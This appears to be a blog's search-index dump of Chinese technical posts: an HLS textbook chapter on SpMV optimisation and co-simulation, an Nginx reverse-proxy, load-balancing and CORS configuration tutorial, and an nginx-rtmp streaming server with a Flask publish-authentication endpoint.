一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。\n这个测试平台相对简单并且可能无法充分验证所有的输入都能正常输出。最主要的原因是，它仅仅只用了一个矩阵作为例子，相反，一个好的激励会测试许多矩阵。通常，会通过随机的方式产生输入的测试用例，并且重点测试边界用例。在这个例子中，我们不仅要保证值正确计算，同时保证通过加速器正确的被执行了，而且编译时间相关的parameter改变会在实现不同加速单元值折中。最关键的是，在相同的parameter上，我们能通过随机产生很多输入数据来进行测试。编译时间相关的参数每次发生变化，都需要我们重新编译代码。\n创建一个复杂的激励来，通过随机数方式生成许多组测试数据。稀疏矩阵编译时间参数应该是可以修改的（例如，SIZE，NNZ 等）。创建一个HLS综合脚本，在编译时间参数合理范围改变时，能执行代码很多次。\n6.4 指定循环的属性 如果直接将上述代码进行综合，我们可以得到函数运行的时钟周期及资源占用率。但是，我们不能得到模块执行所需的时钟周期、任务执行的延迟和任务执行之间的间隔。因为这些都取依赖于输入数据，由spmv函数外部因素决定。最主要的因素是，内层循环执行的次数是由矩阵M中非0元素个数决定的。非0元素的个数在代码中是由常量NNZ决定的，虽然可以调用函数计算不同大小的矩阵，但是实际迭代次数是和输入数据相关的。另外，性能也会因为非0元素的分布、综合优化的约束产生不同。更复杂的是，迭代的次数由输入决定，许多可能的输入并没有被遍历。所以，对于工具而言，不通过复杂的分析和额外的信息，工具是不能知道spmv函数执行需要多少时钟周期。Vivado®HLS 工具也不能进行上述的分析。\nspmv函数能正常工作的前提条件是什么？证明给定的前提条件，矩阵中每个非0元素实是不是在对应一次内层循的执行？\n有几种方式能帮助工具进行性能的分析，其中一种方式就是想Vivado®HLS提供循环边界的额外信息。这可以通过使用loop_tripcount directive实现，它能让设计者指定最小、最大和平均迭代次数针对特定的循环。通过提供这些值， Vivado®HLS 能提供时钟周期级别的评估。\n使用loop_tripcount directive 用变量指定循环的最小，最大和平均迭代次数，这样Vivado®HLS 工具能对当前设计时钟周期数目进行估计。这些不影响最后综合的结果，只会影响综合报告。\n对spmv函数使用loop_tripcount directive，语法格式 # pragma HLS loop_tripcount min=X, max=Y, avg=Z 其中X，Y，Z正的常量。哪个循环需要使用directive?当改变参数（min、max和avg）以后，综合报告有什么不同？这对时钟周期有影响吗？这对资源占用有影响吗？\nloop_tripcount 引导能帮助设计者对函数的性能有个原始的估计。这样能比较相同的函数通过使用不同的directives或者对代码本身重构。但是，这不能确定min、max和 avg 参数。这也很难确定边界条件min和max的值。如果有测试平台，就有一种更准确的方式用于计算spmv函数执行的时钟周期数，那就是C/RTL协同仿真。\n6.5 C/RTL 协同仿真 C/RTL 协同仿真能自动化测试Vivado®HLS工具生成的RTL代码，只需要在综合的时候提供测试平台。每次执行综合以后的代码和提供的测试平台，记录输入和输出结果。输入的值按照时钟转换成输入向量。这里的输入向量用于针对生成的RTL代码进行仿真，同时记录输出向量。更新综合后的代码， 再次运行测试平台并保存输入和输出数据。测试平台如果返回值是0，则表示成功；若激励返回非0值，则表示失败。\nC/RTL 协同仿真流程将VIvado®HLS 生成的RTL代码，通过C 测试平台，实现时钟周期级别的仿真。这样，就能准确对生成的RTL代码进行性能评估，即使性能与输入数据有关。被综合的函数运行周期最小值，最大值，平均值以及间隔在仿真完成以后都能准确的得到。\n注意这些和时钟周期相关的参数是通过激励中测试数据得到的。所以，结果的质量和测试平台的质量息息相关。如果测试平台没有很好的对函数执行测试，那么结果将不准确。另外，输入测试向量都是基于理想的时序，不能反映模型实际工作时，外部接口对函数的影响。实际的性能可能会比仿真的要低，如果执行过程中阻塞在输入数据或对外部存储的访问上。不过，对于循环边界调试时变量的情况，设计者可以通过协同仿真的方式确定时钟周期个数。\nC/RTL协同仿真能提供循环边界是变量的函数的延迟。它反馈函数运行时延迟的最小值、最大值和平均值以及函数运行间隔。这些延迟和测试平台输入的数据是强相关的。\n图6.5 spmv函数内部循环流水执行过程和结构\n当采用图6,4提供的测试平台时，函数运行的最小值、最大值和平均值以及函数间隔是多少个时钟周期？\n6.6 循环的优化与数组的分块 我们可以通过Vivado®HLS 工具得到当前函数的性能和面积的评估结果，然后可以考虑如何对函数进行优化。流水线、循环展开、数组分块是第一类最常用的优化方法。最典型的方式是从最内层的循环，然后根据需要向外层循环进行。\n在这个例子中， 对最内层的L2循环进行流水线化也许是我们最先和最容易想到的优化方式。这个连续迭代的循环在执行上流水以后，总体运行会加快。如果不采用流水，L2 循环将按照串行执行。注意，L1 循环此时还是按照串行的方式执行。\n图6.5演示了spmv函数在L2循环采用流水方式时运行的步骤。每次L2的循环都被II=3I**I=3流水化。流水线允许在外层循环执行一次迭代时，内层循环执行多次循环迭代。此时，内层循环II受限于递归（recurrence ）操作。II=3I**I=3是因为我们认为加法器有3个时钟周期的延迟。外部循环没有采用流水的方式，所以内层的循环必须在下外层L2循环开始执行前，计算完成并输出结果。\n对最内层的L2 for 循环进行流水化，通过在spmv函数中增加流水directive如图6.2所示。II(initiation interval)最后是多少？在你指定II的值以后，最终目标的II值是增大了还是减少了？\n观察执行步骤，我们可以发现有几个因素限制了循环执行性能。第一个因素，递归（recurrence ）操作限制了循环的 II。第二个因素，外层的循环没有采用流水的方式。一种高效计算稀疏矩阵向量乘法的方式，每个时钟周期把乘法器和加法器使用起来。当前的设计离这个目标还很远。\n在章节4.3中，我们探究了几种设计优化技术，其中包括对不同的循环进行流水，循环展开，数组分割。掌握在这些技术之间进行权衡是一项挑战，因为它们之间经常相互依赖。我们通常联合使用这些技术，为了得到好的性能谨慎的选择其中一种而不选择另一种也许结果会更糟糕。例如，在我们使用循环展开是，设计者需要明白它对数据访问的影响。增加了对数据访问的操作但是设计性能又受限于数据访问时，优化毫无益处。同样，如果提供了冗余的存储端口，实际中使用率不高，这样对提高性能毫无帮助反而增加了资源的消耗。\n仔细思考一下上述优化技术组合后复杂多变的样式，我们建议你尝试下面的练习：\n对spmv设计进行综合，采用表6.1提供的10种directives，每种都有不同的流水，展开和分割针对不同的循环和数组。这些分割在不同的数组（values、columnIndex、x）上使用。你看到结果的趋势是如何的？增加了展开和分割，是有利于还是不利于面积？性能如何？为什么？\n表6.1 稀疏矩阵向量乘法可优化的方式\n    L1 L2     case1 - -   case2 - pipeline   case3 pipeline -   case4 unroll=2 -   case5 - pipeline,unroll=2   case6 - pipeline,unroll=2,cyclic=2   case7 - pipeline,unroll=4   case8 - pipeline,unroll=4,cyclic=4   case9 - pipeline,unroll=8   case10 - pipeline,unroll=8,cyclic=8   case11 - pipeline,unroll=8,block=8    如果你完成了上述练习，你会发现盲目的使用优化directives，可能不会得到你期望的结果。通常在设计时， 在思考下考虑应用的特性，选择针对设计的特定优化方式。当然，这也需要一些直觉能力和一些专用工具投入使用。虽然，搞清楚像Vivado®HLS这样复杂工具中每一个细节是困难乃至不可能的，但是我们能基于关键的方面建立思考模型。\n上面我们在用例3和4中考虑对外层循环L1进行流水化操作而不是对内层循环。这种变化针对一个任务，可以提高潜在的并行程度。为了完成优化，Vivado®HLS 工具必须展开代码中所有的内层循环L2 。如果循环能全部展开，这样能减少计算循环边界的时间，同时也能消除递归（recurrences）。但是代码中的内层循环Vivado HLS是无法完全展开的，因为循环边界不是常量。\n例如在实现上面提到的例子3，在最外层的循环L1使用流水化directive。在不设定目标II时，II值是多少？资源占用率发生了什么变化？增加了II后资源占用率结果如何？这与之前采对L2循环进行流水化，结果有什么不同？这和最基本的设计（无 directives）相比有什么不同？当你对外层循环进行展开时，结果到底如何？（提示：检查综合后的日志信息）\n另外一种增加并行化的方式是对内层循环进行局部循环展开，就像之前例子5到10。这种变化实现更多的并行化，通过在相同的循环迭代中，执行更多的操作。有些情况，Vivado HLS 工具在对内层循环进行流水化时，通过实现更多操作来提高性能。但是，这还是很难提高内层循环的II，由于内层循环的递归操作。但是，在II大于1的情况下， 许多操作可以共享同一个计算单元。\n图6.6展示了一个局部展开的代码。在这段代码中，L2 循环被分成2个循环，分别为L2_1和L2_2。最内层的循环L2_2执行的次数由参数S确定。内部循环包含了最原始的L2循环，其中循环边界是由最原始的L2循环确定的。代码中，L2_1 循环包含了不确定次数的乘法和加法操作，运算次数由参数S确定，和一次递归完成累加y0 += yty0+=y**t。\n注意图6.6中的代码和自动循环展开的代码是由一点点区别的。自动循环展开复制计算，但是保留每次计算先后顺序（除了当前的例子）。这就导致了计算顺序由内层循环决定，如图6.7左所示。对计算顺序进行调整后，操作上的依赖关系如图6.7 左边所示。在当前的代码中，最后累加求和是一个递归（recurrence ）。当使用浮点数据类型时，这种调整计算顺序的操作可能对程序产生改变，所以Vivado HLS对这种类型的代码不进行操作顺序自动调整。\n这个设计可能会被综合、实现如图6.8所示的结果。在这个例子中，S=3S=3与III**I最匹配，乘法器的延迟正好是3。所有的运算过程都是在一个乘法器和加法器上执行。比较这个例子与图6.5中的例子，我们可以发现一些缺点。最明显的是，内层循环的流水线长度很长，实现的时候需要多个更多的周期刷新流水线的输出，才能执行下一次外层L1循环。处理一行中非零元素和执行块S 相同。一行有个3个元素和一行有一个元素计算的时间是相同的。剩下的运算也需要在循环流水线中执行，即使他们的结果没有用。为了严格的比较两个设计的特性，我们需要了解设计对矩阵每行非零元素个数的预期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #include \"spmv.h\" const static int S = 7; void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]) { L1: for (int i = 0; i \u003c NUM_ROWS; i++) { DTYPE y0 = 0; L2_1: for (int k = rowPtr[i]; k \u003c rowPtr[i+1]; k += S) { #pragma HLS pipeline II=S  DTYPE yt = values[k] * x[columnIndex[k]]; L2_2: for(int j = 1; j \u003c S; j++) { if(k+j \u003c rowPtr[i+1]) { yt += values[k+j] * x[columnIndex[k+j]]; } } y0 += yt; } y[i] = y0; } }   图6.6 局部展开图6.2中smpv函数\n图6.7 针对累加的两种不同方式的局部展开。左边的版本有3个加法器进行递归操作，相反右边的版本只有1个加法器进行递归累加\n图6.8 图6.6中 spmv函数基于部分展开和内部流水线处理后执行过程\n如果矩阵每行非零元素很少，则采用第一种实现方式较优；如果矩阵中每行非零元素较多，则第二种实现方式更好。\n需要注意，这里存在一个关于先有鸡还是先有蛋的问题。我们需要知道目标器件和时钟周期，这样才能确定流水线中加法器能不能满足时序要求。只有在我们知道流水线的级数之后（也许S=1时，Vivado HLS才能识别到加法递归），我们才能选择合适版本的参数S，来满足II=1I**I=1。一旦我们确定了S，我们能通过C/RTL协同仿真来，通过一组测试数据，确定是不是达到了性能上的要求。因为循环边界是可变的，所以得到的性能参数是依赖于数据的，所以我们需要设定不同的S，来找到性能的最大值。改变器件的类型和工作频率会影响之前所有的设计！尽管看来去高层次综合（HLS）对解决问题提供的帮助不多，相比于RTL开发新版本然后进行验证，它开发起来快（代码编写方便）。\n图6.8可以实现时，S 与加法器流水线等级相同。如果S设定较大，结果会怎样？如果S 设定较小，结果会怎样？如果目标II小于S会怎样？如果目标II大于S会怎样？\n6.7小结 在本章节中，我们介绍了系数矩阵向量乘法（SpMV），这延续了之前对矩阵运算的研究。SpMV 显得很有趣，因为它采用了一种特别的数据结构。为了减少大量的存储，矩阵采用行压缩的方式存储，这样就要求我们以一种非直接的方式对矩阵进行访问。\n这一章节首先我们了Vivado®HLS工具测试和仿真的能力。我们采用一个基于SpMV简单的激励文件，讲解HLS工作流程。另外，我们对Vivado®HLS工具中C/RTL 协同仿真进行了讲解。这对我们得到设计准确性能结果是十分重要。矩阵越不稀疏，则更多的计算需要执行。在测试平台确定以后，协同仿真可以提供程序运行的精确仿真。这样就可以达到执行周期和性能结果。最后，我们讨论了采用循环优化和数组分块对代码进行优化。\n fpga并行编程\n ","description":"","tags":["spmv"],"title":"SpMV","uri":"/posts/spmv/"},{"categories":["nginx"],"content":"Nginx安装及配置  本文参考：\nNginx安装配置_菜鸟教程\nNginx中文文档\nNginx简易教程\n 概述 什么是nginx?\nNginx (engine x) 是一款轻量级的Web 服务器 、反向代理服务器及电子邮件（IMAP/POP3）代理服务器。\n什么是反向代理？\n反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。\n安装与使用 安装\nnginx官网下载地址：http://nginx.org，发布版本分为 Linux 和 windows 版本。\n也可以下载源码，编译后运行。\n从源代码编译 Nginx\n把源码解压缩之后，在终端里运行如下命令：\n1 2 3  $ ./configure $ make $ sudo make install   默认情况下，Nginx 会被安装在 /usr/local/nginx。通过设定编译选项，你可以改变这个设定。\nWindows 安装\n为了安装 Nginx / Win32，需先下载它(Nginx官方下载)。然后解压之，然后运行即可。下面以 C 盘根目录为例说明下：\n1  nginx-0.8.54 start nginx   Nginx / Win32 是运行在一个控制台程序，而非 windows 服务方式的。服务器方式目前还是开发尝试中。\n使用 nginx 的使用比较简单，就是几条命令。\n常用到的命令如下：\n **nginx -s stop ：**快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。 **nginx -s quit ：**平稳关闭Nginx，保存相关信息，有安排的结束web服务。 **nginx -s reload ：**因改变了Nginx相关配置，需要重新加载配置而重载。 **nginx -s reopen ：**重新打开日志文件。 **nginx -c filename ：**为 Nginx 指定一个配置文件，来代替缺省的。 **nginx -t ：**不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。 **nginx -v：**显示 nginx 的版本。 **nginx -V：**显示 nginx 的版本，编译器版本和配置参数。  如果不想每次都敲命令，可以在nginx安装目录下新添一个启动批处理文件startup.bat，双击即可运行。内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12  @echo off rem 如果启动前已经启动nginx并记录下pid文件，会kill指定进程 nginx.exe -s stop rem 测试配置文件语法正确性 nginx.exe -t -c conf/nginx.conf rem 显示版本信息 nginx.exe -v rem 按照指定配置去启动nginx nginx.exe -c conf/nginx.conf   如果是运行在 Linux 下，写一个 shell 脚本，大同小异。\n配置 nginx 配置实战 我始终认为，各种开发工具的配置还是结合实战来讲述，会让人更易理解。\nhttp反向代理配置 我们先实现一个小目标：不考虑复杂的配置，仅仅是完成一个 http 反向代理。\nnginx.conf 配置文件如下： 注：conf / nginx.conf 是 nginx 的默认配置文件。你也可以使用 nginx -c 指定你的配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  #运行用户 #user somebody; #启动进程,通常设置成和cpu的数量相等 worker_processes 1; #全局错误日志 error_log D:/Tools/nginx-1.10.1/logs/error.log; error_log D:/Tools/nginx-1.10.1/logs/notice.log notice; error_log D:/Tools/nginx-1.10.1/logs/info.log info; #PID文件，记录当前启动的nginx的进程ID pid D:/Tools/nginx-1.10.1/logs/nginx.pid; #工作模式及连接数上限 events { worker_connections 1024; #单个后台worker process进程的最大并发链接数 } #设定http服务器，利用它的反向代理功能提供负载均衡支持 http { #设定mime类型(邮件支持类型),类型由mime.types文件定义 include D:/Tools/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #设定日志 log_format main '[$remote_addr] - [$remote_user] [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log D:/Tools/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy 方式）来输出文件，对于普通应用， #必须设为 on,如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度，降低系统的uptime. sendfile on; #tcp_nopush on; #连接超时时间 keepalive_timeout 120; tcp_nodelay on; #gzip压缩开关 #gzip on; #设定实际的服务器列表 upstream zp_server1{ server 127.0.0.1:8089; } #HTTP服务器 server { #监听80端口，80端口是知名端口号，用于HTTP协议 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #首页 index index.html #指向webapp的目录 root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp; #编码格式 charset utf-8; #代理配置参数 proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #反向代理的路径（和upstream绑定），location 后面设置映射的路径 location / { proxy_pass http://zp_server1; } #静态文件，nginx自己处理 location ~ ^/(images|javascript|js|css|flash|media|static)/ { root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews; #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。 expires 30d; } #设定查看Nginx状态的地址 location /NginxStatus { stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file conf/htpasswd; } #禁止访问 .htxxx 文件 location ~ /.ht { deny all; } #错误处理页面（可选择性配置） #error_page 404 /404.html; #error_page 500 502 503 504 /50x.html; #location = /50x.html { # root html; #} } }   好了，让我们来试试吧：\n 启动 webapp，注意启动绑定的端口要和nginx中的 upstream 设置的端口保持一致。 更改 host：在 C:WindowsSystem32driversetc 目录下的host文件中添加一条DNS 记录127.0.0.1 http://www.helloworld.com 启动前文中 startup.bat 的命令 在浏览器中访问 http://www.helloworld.com，不出意外，已经可以访问了。  负载均衡配置 上一个例子中，代理仅仅指向一个服务器。\n但是，网站在实际运营过程中，多半都是有多台服务器运行着同样的app，这时需要使用负载均衡来分流。\nnginx也可以实现简单的负载均衡功能。\n假设这样一个应用场景：将应用部署在 192.168.1.11:80、192.168.1.12:80、192.168.1.13:80 三台linux环境的服务器上。网站域名叫 http://www.helloworld.com，公网IP为 192.168.1.11。在公网IP所在的服务器上部署 nginx，对所有请求做负载均衡处理。\nnginx.conf 配置如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  http { #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #设定日志格式 access_log /var/log/nginx/access.log; #设定负载均衡的服务器列表 upstream load_balance_server { #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; } #HTTP服务器 server { #侦听80端口 listen 80; #定义使用www.xx.com访问 server_name www.helloworld.com; #对所有请求进行负载均衡请求 location / { root /root; #定义服务器的默认网站根目录位置 index index.html index.htm; #定义首页索引文件的名称 proxy_pass http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表 #以下是一些反向代理的配置(可选择性配置) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 } } }   网站有多个webapp的配置 当一个网站功能越来越丰富时，往往需要将一些功能相对独立的模块剥离出来，独立维护。这样的话，通常，会有多个 webapp。\n举个例子：假如 http://www.helloworld.com 站点有好几个webapp，finance（金融）、product（产品）、admin（用户中心）。访问这些应用的方式通过上下文(context)来进行区分:\n http://www.helloworld.com/finance/ http://www.helloworld.com/product/ http://www.helloworld.com/admin/  我们知道，http的默认端口号是80，如果在一台服务器上同时启动这3个 webapp 应用，都用80端口，肯定是不成的。所以，这三个应用需要分别绑定不同的端口号。\n那么，问题来了，用户在实际访问 http://www.helloworld.com 站点时，访问不同 webapp，总不会还带着对应的端口号去访问吧。所以，你再次需要用到反向代理来做处理。\n配置也不难，来看看怎么做吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  http { #此处省略一些基本配置 upstream product_server{ server www.helloworld.com:8081; } upstream admin_server{ server www.helloworld.com:8082; } upstream finance_server{ server www.helloworld.com:8083; } server { #此处省略一些基本配置 #默认指向product的server location / { proxy_pass http://product_server; } location /product/{ proxy_pass http://product_server; } location /admin/ { proxy_pass http://admin_server; } location /finance/ { proxy_pass http://finance_server; } } }   https反向代理配置 一些对安全性要求比较高的站点，可能会使用 HTTPS（一种使用ssl通信标准的安全HTTP协议）。\n这里不科普 HTTP 协议和 SSL 标准。但是，使用 nginx 配置 https 需要知道几点：\n HTTPS 的固定端口号是 443，不同于 HTTP 的 80 端口 SSL 标准需要引入安全证书，所以在 nginx.conf 中你需要指定证书和它对应的 key  其他和 http 反向代理基本一样，只是在 Server 部分配置有些不同。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #HTTP服务器 server { #监听443端口。443为知名端口号，主要用于HTTPS协议 listen 443 ssl; #定义使用www.xx.com访问 server_name www.helloworld.com; #ssl证书文件位置(常见证书文件格式为：crt/pem) ssl_certificate cert.pem; #ssl证书key位置 ssl_certificate_key cert.key; #ssl配置参数（选择性配置） ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #数字签名，此处使用MD5 ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / { root /root; index index.html index.htm; } }   给出一个反向代理的简单例子\n参考：https://www.jianshu.com/p/bcfb5a3a5903\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # 添加上面的https server { listen 443 ssl; ssl_certificate server.crt; ssl_certificate_key server_nopwd.key; } server { listen 8080; # 访问8080端口，跳转到网易首页  location / { proxy_pass https://163.com; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # 访问 8080:/readme.md 从github上获取相应的文件  location /readme.md { proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/yidao620c/scrapy-cookbook/blob/master/README.md; } }   静态站点配置 有时候，我们需要配置静态站点(即 html 文件和一堆静态资源)。\n举例来说：如果所有的静态资源都放在了 /app/dist 目录下，我们只需要在 nginx.conf 中指定首页以及这个站点的 host 即可。\n配置如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server { listen 80; server_name static.zp.cn; location / { root /app/dist; index index.html; #转发任何请求到 index.html } } }   然后，添加 HOST：127.0.0.1 http://static.zp.cn，此时，在本地浏览器访问 http://static.zp.cn ，就可以访问静态站点了。\n跨域解决方案 web 领域开发中，经常采用前后端分离模式。这种模式下，前端和后端分别是独立的 web 应用程序，例如：后端是 Java 程序，前端是 React 或 Vue 应用。\n各自独立的 web app 在互相访问时，势必存在跨域问题。解决跨域问题一般有两种思路：\nCORS 在后端服务器设置 HTTP 响应头，把你需要运行访问的域名加入加入 Access-Control-Allow-Origin 中。\njsonp 把后端根据请求，构造json数据，并返回，前端用 jsonp 跨域。\n这两种思路，本文不展开讨论。\n需要说明的是，nginx 根据第一种思路，也提供了一种解决跨域的解决方案。\n举例：http://www.helloworld.com 网站是由一个前端 app ，一个后端 app 组成的。前端端口号为 9000， 后端端口号为 8080。\n前端和后端如果使用 http 进行交互时，请求会被拒绝，因为存在跨域问题。来看看，nginx 是怎么解决的吧：\n首先，在 enable-cors.conf 文件中设置 cors ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # allow origin list set $ACAO '*'; # set single origin if ($http_origin ~* (www.helloworld.com)$) { set $ACAO $http_origin; } if ($cors = \"trueget\") { add_header 'Access-Control-Allow-Origin' \"$http_origin\"; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type'; } if ($request_method = 'OPTIONS') { set $cors \"${cors}options\"; } if ($request_method = 'GET') { set $cors \"${cors}get\"; } if ($request_method = 'POST') { set $cors \"${cors}post\"; }   接下来，在你的服务器中 include enable-cors.conf 来引入跨域配置：\n# ---------------------------------------------------- # 此文件为项目 nginx 配置片段 # 可以直接在 nginx config 中 include（推荐） # 或者 copy 到现有 nginx 中，自行配置 # www.helloworld.com 域名需配合 dns hosts 进行配置 # 其中，api 开启了 cors，需配合本目录下另一份配置文件 # ---------------------------------------------------- upstream front_server{ server www.helloworld.com:9000; } upstream api_server{ server www.helloworld.com:8080; } server { listen 80; server_name www.helloworld.com; location ~ ^/api/ { include enable-cors.conf; proxy_pass http://api_server; rewrite \"^/api/(.*)$\" /$1 break; } location ~ ^/ { proxy_pass http://front_server; } } ","description":"","tags":["nginx"],"title":"Nginx","uri":"/posts/nginx/"},{"categories":["nginx"],"content":"nginx+rtmp 搭建视频直播服务器 服务器安装配置  windows安装包(已编译好的版本)参考：\nnginx for windows\nwindows下搭建基于nginx的rtmp服务器\n在Windows下搭建基于nginx的视频直播和点播系统\n  搬运源码（未编译）\nCar-eye-RTMP-server(github)\ncar-eye-http-flv-module\n  nginx+rtmp在windows下编译\nWindows下编译nginx-rtmp-module\nwindows下编译nginx+nginx_rtmp_modue(vs2013)\n  CentOS搭建nginx+rtmp服务器\nnginx+rtmp直播流服务搭建 centos7\ncentos7 Nginx+rtmp 搭建流媒体服务器\n linux下建议将nginx.conf中的http端口改为1024以上，好像是80端口每次运行都需要su权限。\nNginx搭建rtmp流媒体服务器\nnginx服务器常用命令 1 2 3 4 5 6 7 8 9 10 11  ./nginx -v//查看nginx版本号 ./nginx -V //查看nginx详细的版本信息 start ./nginx -c conf/nginx.conf //以nginx.conf的配置启动nginx ./nginx -s stop//停止nginx服务器 ./nginx -s quit//停止nginx服务器 ./nginx -s reload//重启nginx服务器 service nginx reload//重启nginx服务器 ./nginx -t (-c conf/nginx.conf)//检查配置文件是否正确 ./nginx -h//显示帮助信息 ./nginx -?//显示帮助信息   nginx+rtmp加入权限控制  本文参考：\n*rtmp-module官方wiki\n*视频直播点播nginx-rtmp开发手册中文版(参考wiki版本粗译)\n如何给 nginx rtmp 服务加入鉴权机制(改源码)\n*「自己开发直播」实现nginx-rtmp-module多频道输入输出与权限控制\nnginx-rtmp-module授权机制实现直播推流多房间授权认证\nnginx-rtmp-module 权限控制\nnginx-rtmp加入权限验证的简单方法\n视频直播点播nginx-rtmp开发手册中文版\n*nginx.conf中关于nginx-rtmp-module配置指令详解\n*nginx-rtmp多房间和授权实现\n *博客比较有用\n  nginx的rtmp-module默认不限制推流权限、播放权限。\n想加入权限验证有很多种方法。\n其中一个是改源码，一个是利用nginx+rtmp的配置文件调用后台接口进行验证。\n第一种方法没成功过，第二种方法比较简单。此文介绍第二种方法，第一种方法可见博客-\u003e如何给 nginx rtmp 服务加入鉴权机制(改源码)\n原理主要是利用on_publish跳转到当前配置的一个“location”，在这里进行验证。关键点在于rtmp application节点下面要配置“notify_method get;”为什么呢？因为跳转的时候，默认以POST方式传输参数，修改成GET方式，nginx配置里就可以轻松处理了。（当然nginx通过配置文件也可以处理post，只是复杂一些）。\n我们在此使用python的后台框架flask处理on_publish的post请求。\n后台返回http200即为通过验证，返回http500即为验证失败，服务器拒绝连接。\nnginx的配置文件（位于nginx安装目录下：.../nginx/conf/nginx.conf）修改如下:\nrtmp { server { #listen 1935; listen 10077; chunk_size 4000; application live { live on; on_publish http://localhost:10078/user/auth;//后面的url即flask监听的地址 } application hls { live on; hls on; #hls_path ../nginx-1.7.11.3-Gryphon/html/hls; hls_path ../hls; hls_fragment 5s; on_publish http://localhost:10078/user/auth; } } } python的flask后台代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #!/usr/bin/env python # -*- coding:utf-8 -*- #https://www.jianshu.com/p/0d14ae8f081c #https://blog.csdn.net/wei389083222/article/details/78721074/ #https://blog.csdn.net/weixin_34368949/article/details/85991563 #验证只能用post方法 #虽然流密钥的格式像是get类型，但是必须使用POST获取参数。 from flask import Flask, request, Response app = Flask(__name__) #传入url格式为: xx.xx.xx.xx:10078/user/auth?usr=xxx\u0026passWord=xxx @app.route('/user/auth',methods=['POST']) def auth(): usr = request.form['usr']#从url后获取的数据 passWord = request.form['passWord'] print(usr,'\\t',passWord) #此处可改为从数据库获取数据 auth_user='abc' auth_passWord='123' if auth_user == usr and auth_passWord ==passWord: return Response(response='success',status=200)#返回200状态码 else: return Response(status=500)#返回500状态码 #Flask.abort(404) return passWord if __name__ == '__main__': 